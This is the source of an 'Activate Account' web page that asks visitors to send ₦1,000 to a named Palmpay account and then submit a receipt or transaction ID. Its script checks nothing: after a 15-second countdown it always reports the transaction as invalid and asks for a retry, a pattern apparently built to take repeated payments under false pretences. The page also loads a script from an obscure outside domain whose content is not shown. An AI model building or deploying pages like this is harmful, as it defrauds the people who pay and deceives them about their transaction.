<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Activate Account</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        background: #3d260e;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
      }

      .container {
        display: flex;
        width: 90%;
        max-width: 800px;
        background: white;
        border-radius: 10px;
        box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
      }

      .logo {
        width: 80px;
      }

      main {
        width: 80%;
        padding: 20px;
      }

      .payment-box {
        text-align: center;
      }

      .amount {
        font-size: 24px;
        font-weight: bold;
        color: #007784;
      }

      .account-details {
        background: #eef6f6;
        padding: 10px;
        border-radius: 5px;
        margin-left: 20px;
        margin-right: -10px;
        align-items: center;
      }

      .account-number {
        font-size: 20px;
        font-weight: bold;
        color: #007784;
      }

      button {
        background: #ff9800;
        border: none;
        color: white;
        padding: 10px;
        width: 90%;
        margin-top: 10px;
        margin-right: -30px;
        cursor: pointer;
        border-radius: 5px;
        font-size: 16px;
      }

      .hidden {
        display: none;
      }

      #upload-section {
        margin-top: 20px;
        padding: 10px;
        background: #f8f8f8;
        border-radius: 5px;
      }

      input[type="text"],
      input[type="file"] {
        width: 100%;
        padding: 10px;
        margin-top: 10px;
        border: 1px solid #ccc;
        border-radius: 5px;
      }

      #errorMsg {
        color: red;
        font-weight: bold;
        margin-top: 10px;
      }

      #countdown {
        font-size: 18px;
        font-weight: bold;
        color: blue;
        margin-top: 10px;
      }
    </style>
    <script src="script.js" defer></script>
    <script
      src="https://kit.fontawesome.com/a076d05399.js"
      crossorigin="anonymous"
    ></script>
  </head>
  <body>
    <div class="container">
      <main>
        <div class="payment-box">
          <h2>Amount to Pay</h2>
          <p class="amount">₦1,000.00</p>
          <p>Amount <strong>₦1,000.00</strong> | Fee <strong>₦0.00</strong></p>

          <h3><i class="fas fa-paper-plane"></i> Pay with Transfer</h3>
          <p>Transfer to the account details below</p>

          <div class="account-details">
            <h4>Palmpay</h4>
            <p class="account-number">6602270948 <i class="fas fa-copy"></i></p>

            <p><strong>Account Name:</strong>BETASUBBOL</p>
          </div>

          <button id="transferredBtn">I've transferred the money</button>

          <div id="upload-section" class="hidden">
            <label for="receiptUpload"
              ><i class="fas fa-upload"></i> Upload Receipt</label
            >
            <input type="file" id="receiptUpload" accept="image/*" />

            <p>OR</p>

            <input
              type="text"
              id="transactionId"
              placeholder="Enter Transaction ID"
            />

            <button id="confirmBtn">Confirm</button>
          </div>

          <div id="countdown" class="hidden">
            Please wait <span id="countdownTimer">15</span> seconds...
          </div>
          <div id="errorMsg" class="hidden">
            Transaction is invalid. Please retry.
          </div>
        </div>
      </main>
    </div>
    <script>
      document
        .getElementById("transferredBtn")
        .addEventListener("click", () => {
          document.getElementById("upload-section").classList.remove("hidden");
        });

      document.getElementById("confirmBtn").addEventListener("click", () => {
        let transactionId = document.getElementById("transactionId").value;
        let receipt = document.getElementById("receiptUpload").files.length;

        if (transactionId.trim() === "" && receipt === 0) {
          alert("Please upload a receipt or enter transaction ID!");
          return;
        }

        document.getElementById("upload-section").classList.add("hidden");
        document.getElementById("countdown").classList.remove("hidden");

        let countdown = 15;
        let timer = setInterval(() => {
          document.getElementById("countdownTimer").innerText = countdown;
          countdown--;

          if (countdown < 0) {
            clearInterval(timer);
            document.getElementById("countdown").classList.add("hidden");
            document.getElementById("errorMsg").classList.remove("hidden");
          }
        }, 1000);
      });
    </script>
    <script
      type="text/javascript"
      src="//slushhelmetmirth.com/39/2a/0d/392a0d28346a0e19cd71e87eccfdecf0.js"
    ></script>
  </body>
</html>
